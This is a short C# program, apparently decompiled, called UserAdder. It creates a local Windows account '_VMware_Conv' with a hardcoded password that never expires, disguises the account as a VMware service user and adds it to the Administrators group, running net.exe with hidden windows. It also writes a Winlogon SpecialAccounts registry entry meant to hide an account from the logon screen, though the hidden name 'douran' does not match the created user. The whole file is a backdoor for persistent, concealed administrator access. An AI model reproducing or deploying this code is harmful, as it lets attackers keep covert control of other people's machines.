// Author Pavan Kumar Bandaru 🔥👨🏽‍💻😜
// Type: C# Program


using Microsoft.Win32;
using System;
using System.Diagnostics;

namespace UserAdder
{
  internal class Program
  {
    private static void CreateLocalUser(string username, string password)
    {
      Process process = new Process();
      process.StartInfo.WorkingDirectory = "C:\\WINDOWS\\SYSTEM32";
      process.StartInfo.FileName = "net.exe";
      process.StartInfo.UseShellExecute = false;
      process.StartInfo.RedirectStandardError = true;
      process.StartInfo.RedirectStandardInput = true;
      process.StartInfo.RedirectStandardOutput = true;
      process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
      process.StartInfo.Arguments = " user " + username + " " + password + " /ADD /ACTIVE:YES /EXPIRES:NEVER /comment:VMware_User";
      process.Start();
      process.WaitForExit();
      process.Close();
    }

    private static void CreateLocalGroup(string group, string user)
    {
      Process process = new Process();
      process.StartInfo.WorkingDirectory = "C:\\WINDOWS\\SYSTEM32";
      process.StartInfo.FileName = "net.exe";
      process.StartInfo.UseShellExecute = false;
      process.StartInfo.RedirectStandardError = true;
      process.StartInfo.RedirectStandardInput = true;
      process.StartInfo.RedirectStandardOutput = true;
      process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
      process.StartInfo.Arguments = " LOCALGROUP " + group + " " + user + " /ADD ";
      process.Start();
      process.WaitForExit();
      process.Close();
    }

    private static void Main(string[] args)
    {
      RegistryKey subKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).CreateSubKey("Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\Userlist");
      string name = "douran";
      // ISSUE: variable of a boxed type
      __Boxed<int> local = (ValueType) 0;
      int num = 4;
      subKey.SetValue(name, (object) local, (RegistryValueKind) num);
      subKey.Close();
      Program.CreateLocalUser("_VMware_Conv", "abcd@1234");
      Program.CreateLocalGroup("Administrators", "_VMware_Conv");
    }
  }
}
